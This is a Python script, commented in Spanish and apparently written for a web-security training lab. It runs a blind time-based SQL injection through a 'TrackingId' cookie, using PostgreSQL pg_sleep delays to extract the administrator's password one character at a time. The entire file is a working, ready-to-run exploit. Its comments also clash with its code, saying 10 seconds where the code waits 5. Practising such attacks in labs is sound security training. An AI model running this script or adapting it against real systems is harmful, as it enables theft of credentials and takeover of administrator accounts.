import sys
import requests
import urllib3
import urllib
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extrated = ""
    for i in range(1, 21):  # Iteramos por cada posición de la contraseña
        for j in range(32, 126):  # Probamos caracteres ASCII del 32 al 125
            # Payload modificado con pg_sleep(10) para retrasar la respuesta si el carácter es correcto
            # sqli_payload = "'; SELECT CASE WHEN username = 'administrator' AND SUBSTRING(password,%s,1)='%s' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--" % (i, chr(j))
            sqli_payload = "'||(select case when (username='administrator' and substring(password,%s,1)='%s') then pg_sleep(5) else pg_sleep(0) end from users)--" % (i, chr(j))
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'VwKMggVtfIDTfGyx' + sqli_payload_encoded, 'session': 'Um2Hg4Z5pU5wvwzt5tpay2DQ09rucBi5'}
            
            # Medir el tiempo de respuesta
            start_time = time.time()
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            end_time = time.time()
            
            # Si la respuesta toma alrededor de 10 segundos, significa que encontramos un carácter válido
            if end_time - start_time > 4:  # Si el retraso es mayor a 4 segundos (aproximadamente 10)
                password_extrated += chr(j)
                sys.stdout.write('\r' + password_extrated)
                sys.stdout.flush()
                break  # Salimos del loop una vez que encontramos un carácter
                
            # Si no hay retraso significativo, simplemente continuamos con el siguiente carácter
            else:
                sys.stdout.write('\r' + password_extrated + chr(j))
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s \"www.example.com\"" % sys.argv[0])

    url = sys.argv[1]
    print("(+) Retrieving administrator password ...")
    sqli_password(url)

if __name__ == "__main__":
    main()